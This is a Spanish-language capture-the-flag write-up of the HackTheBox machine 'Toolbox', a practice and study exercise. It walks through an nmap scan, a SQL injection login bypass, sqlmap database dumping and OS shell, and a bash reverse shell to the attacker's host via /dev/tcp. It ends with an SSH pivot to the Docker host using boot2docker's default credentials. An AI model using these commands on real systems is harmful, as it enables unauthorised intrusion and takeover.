---
title: Toolbox
published: 2025-03-11
image: "./logo.png"
tags: [Easy, PostgreSQL Injection (RCE), Abusing boot2docker, Pivoting, OSCP, eWPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- PostgreSQL Injection (RCE)
- Abusing boot2docker [Docker-Toolbox]
- Pivoting

### Preparación

- eWPT
- OSCP (Intrusión)

***

## Reconocimiento

Para comenzar con el reconocimiento, empezaremos con un escaneo de nmap hacia los puertos de esta máquina.

```
nmap -p- -sCV -oN nmap_report -vvv 10.10.10.236
```

```
# Nmap 7.95 scan initiated Mon Mar 10 23:21:52 2025 as: /usr/lib/nmap/nmap --privileged -p- -sCV -oN nmap_report -vvv 10.10.10.236
Nmap scan report for 10.10.10.236
Host is up, received echo-reply ttl 127 (0.042s latency).
Scanned at 2025-03-10 23:21:52 CET for 85s
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGMBbGgDiOZZt3bkOSs3/y3cFfYWVGPbw89lYh0OGLZ0J2eQfLPchbOe5jj+FY8uwizKA4ZwPrLe523TXoxTXmoI80LBl3sOPDb9xCBMfpYI72DRMiipB88CYC4vez8lsyofabtC2t
kl6aMLc2zom62cI0jjBpmjLfLDUy1O9f/vFw0H+Qr2nGxr81dIy7E5ca5+lxMW1RP++TZAKK243GqgJLoZFRINIjA9QIgBmD2ZYSyUM3nkd8Kc5EuaaWuhggstXDEXOnxJP7S8p12IJhjtF2Tikcy5pg+qFD128o+PBa19FFc6NtNdaWDA
nt8HvuZUbDgKy+e33ytA2dworB
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR9i0NqfFj31XNbDraGeI6rcylMmHucBKlMt4kswXRNyjdyXbxkYxHYt/cflrLg+687H7cfQKamV0RbLnqle7E=
|   256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOuBCr4Rn8G4uD6IINB2myKifcJ8tJU03cOPDpS5vz14
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.38 ((Debian))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.38 (Debian)
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR/emailAddress=admin@megalogistic.com/organizationalUnitName=Web
| Issuer: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR/emailAddress=admin@megalogistic.com/organizationalUnitName=Web
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-02-18T17:45:56
| Not valid after:  2021-02-17T17:45:56
| MD5:   091b:4c45:c743:a4e0:bdb2:d2aa:d860:f3d0
| SHA-1: 8255:9ba0:3fc7:79e4:f05d:8232:5bdf:a957:8b2b:e3eb
| -----BEGIN CERTIFICATE-----
| MIIECTCCAvGgAwIBAgIUFlHtTkX6tBT3FO+WSrUupHAN9TkwDQYJKoZIhvcNAQEL
| BQAwgZMxCzAJBgNVBAYTAkdSMRMwEQYDVQQIDApTb21lLVN0YXRlMRkwFwYDVQQK
| DBBNZWdhTG9naXN0aWMgTHRkMQwwCgYDVQQLDANXZWIxHzAdBgNVBAMMFmFkbWlu
| Lm1lZ2Fsb2dpc3RpYy5jb20xJTAjBgkqhkiG9w0BCQEWFmFkbWluQG1lZ2Fsb2dp
| c3RpYy5jb20wHhcNMjAwMjE4MTc0NTU2WhcNMjEwMjE3MTc0NTU2WjCBkzELMAkG
| A1UEBhMCR1IxEzARBgNVBAgMClNvbWUtU3RhdGUxGTAXBgNVBAoMEE1lZ2FMb2dp
| c3RpYyBMdGQxDDAKBgNVBAsMA1dlYjEfMB0GA1UEAwwWYWRtaW4ubWVnYWxvZ2lz
| dGljLmNvbTElMCMGCSqGSIb3DQEJARYWYWRtaW5AbWVnYWxvZ2lzdGljLmNvbTCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN11gJPFfp7ter5VFvgy0fCP
| 56N50Gk0R18C6e7KK3KKtXsjtIRD1Ri2ApmmjC+IwDpI0XgN0iem1NUbXE1HhwxB
| 1HrigkBudq3jQRVM0tVVYDK6+SEiOdehiXbc1Gsih0yUaMty4Ak6Asq4gli1g+ku
| fqtf7r273C8GJEQUHcCMBdXO/K1K2oTK9+bcsIETNuwALtwYbr/nim1RGLYQTtX7
| +CqkNj2Bw5YOxVqTAs5CQ3ZRIXTk/DLgR+bWOxxJKHLPFJfBq7czKkZ7k5gg9dPS
| HnWjW+amHutlRFYgRFeaaqiE+UBDVJDriB1zX1HUC3R1Y8IblatJRxV6tGKoG0cC
| AwEAAaNTMFEwHQYDVR0OBBYEFG4EpOryu7s315zTdLHk2SbghyWvMB8GA1UdIwQY
| MBaAFG4EpOryu7s315zTdLHk2SbghyWvMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZI
| hvcNAQELBQADggEBAEjzSNoiMG7e/dtnsy59rdMah0dkpRe5Dmi7gZt3IbdgwzSi
| rVOxWtnP3lItPB+/Y8+SOgqr/xUqd3cT1Ebol5ZraeWBvYUfaMG7XE7I98wWiSGW
| 6pqeCJ8cWmVuzI4y0E11BSTHoJQYCcshChahp7bt+TiqdfJLHeigO55W2FGXj1mf
| YGCZ8xnG6jOvXwA5xn8H2RT2teCpejfW/gN47rSCDSZbkcQCDuiak/LRQ71QO8y6
| 2KK6EnYIaO3OnyPHov0CvZdx0XgSJUpQTlMOySuXL+teRHmHPx/r7GOMGP0vpKLs
| OXZaAjnSN1+8nCldxAiaL8u4kxikQkaMKo1/5Ks=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: MegaLogistics
445/tcp   open  microsoft-ds? syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-10T22:23:14
|_  start_date: N/A
|_clock-skew: 2s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61473/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12354/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34913/udp): CLEAN (Failed to receive data)
|   Check 4 (port 23787/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 10 23:23:17 2025 -- 1 IP address (1 host up) scanned in 85.76 seconds
```

Podemos ver bastantes cosas interesantes como en el puerto **21** el inicio de sesión anónimo y el archivo o el dominio del puerto **443** que vamos a añadir al `/etc/hosts`.

### megalogistic.com

Vamos a ver que hay en el dominio `megalogistic.com`.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FvJvlPmlubMNA5X8rLZPU%2F1.png?alt=media&#x26;token=ca2a7dd4-cb34-4557-b5eb-e050a8e3821e" alt=""><figcaption></figcaption></figure>

### admin.megalogistic.com

No parece haber nada interesante, vamos a ver ahora `admin.megalogistic.com`.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F0iZlKIw2Nlwlh8GHfSRU%2F2.png?alt=media&#x26;token=540f6820-d61c-4043-92d5-c374e963a9e9" alt=""><figcaption></figcaption></figure>

### SQL Injection

En este dominio tenemos un panel de inicio de sesión. Vamos a probar una **inyección SQL**.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fuu1uPGEaQUHyPQSBrUhx%2F3.png?alt=media&#x26;token=b4c0069a-264a-40cb-95e2-a8e6062eaa12" alt=""><figcaption></figcaption></figure>

Vemos que al poner una comilla nos salta un error. Si buscamos información sobre `pq_query()` , veremos que es una base de datos **PostgreSQL**. Vamos a intentar saltar la validación de contraseña poniendo `admin' --`.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FmnYLproymcj2NyKY9BC6%2F4.png?alt=media&#x26;token=c5389444-a36d-4de5-a1c6-037b29032737" alt=""><figcaption></figcaption></figure>

Y ya estaríamos dentro del panel **admin**. Al no ver nada interesante, podemos intentar enumerar datos de la base de datos con **sqlmap**.

```
sqlmap -u http://admin.megalogistic.com --batch --force-ssl --dbms=PostgreSQL -X POST --data 'username=tony&password=pass'
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F15RXC8L3HKTUqL9syg7s%2F5.png?alt=media&#x26;token=f90d5a41-ea4d-4976-89d1-d6c836708a17" alt=""><figcaption></figcaption></figure>

Vemos que tiene **4 puntos** diferentes de inyección, vamos a intentar usar el parámetro `--dump` , para intentar dumpear información de la base de datos.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FN1l2gdTTHZ2NhqugxHu4%2F6.png?alt=media&#x26;token=4a8bfd0e-38c3-4ade-aef5-0aba0fc167c5" alt=""><figcaption></figcaption></figure>

Vemos la contraseña en hash de admin, pero no hemos podido crackearla con un diccionario común. Ahora vamos a intentar usar `--os-shell`, para listar aún más información de la máquina.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FKX6XYcWIow4kUcnpnsq7%2F7.png?alt=media&#x26;token=879df1fb-e9b8-4622-8cd1-d7ee7518be24" alt=""><figcaption></figcaption></figure>

Confirmamos que estamos dentro de un Docker Linux.&#x20;

## Explotación

Vamos a crearnos una **revershe shell**.

```
bash -c 'sh -i >& /dev/tcp/10.10.14.15/8889 0>&1'
```

Y nos ponemos a la escucha por **netcat**. Además estabilizaremos la shell con los siguientes comandos:

```
python3 -c 'import pty;pty.spawn("bash")'  
ctrl + z
stty raw echo; fg
ctrl + m
```

Una vez hecho ya podremos obtener la user flag.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FUy6DqlCeaXCdjvTDZWUt%2F8.png?alt=media&#x26;token=aa28f774-c0c1-4d49-9460-bf2b99394604" alt=""><figcaption></figcaption></figure>

## Escalada de privilegios

Buscando información sobre el docker **boot2docker** ([https://github.com/boot2docker/boot2docker](https://github.com/boot2docker/boot2docker)), podemos ver que es un **Docker** que funciona desde la **RAM** y está descontinuado. Buscando un poco en internet podemos ver que las credenciaes de acceso para **SSH** por defecto son **docker**:**tcuser**. Vamos a probarlas.

```
postgres@bc56e3cc55e9:/var/lib/postgresql$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 4817  bytes 704512 (688.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4976  bytes 5316919 (5.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Como nuestra IP es **172.17.0.2** la de la máquina real seguramente sea **172.17.0.1**.

```
ssh docker@172.17.0.1
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F5j2u56B1cdqQloXok3O5%2F9.png?alt=media&#x26;token=a2cb6029-d12d-45b9-a154-e217f4d1176a" alt=""><figcaption></figcaption></figure>

Investigando un poco el directorio **c** contiene el usuario **Administrator** y **Tony**, por lo que simplemente conseguimos la root flag.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FGOnTgH4H5HLg2XoXQcUk%2F10.png?alt=media&#x26;token=de9d9131-c3d9-45af-8647-e2ded2123947" alt=""><figcaption></figcaption></figure>

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/339)

---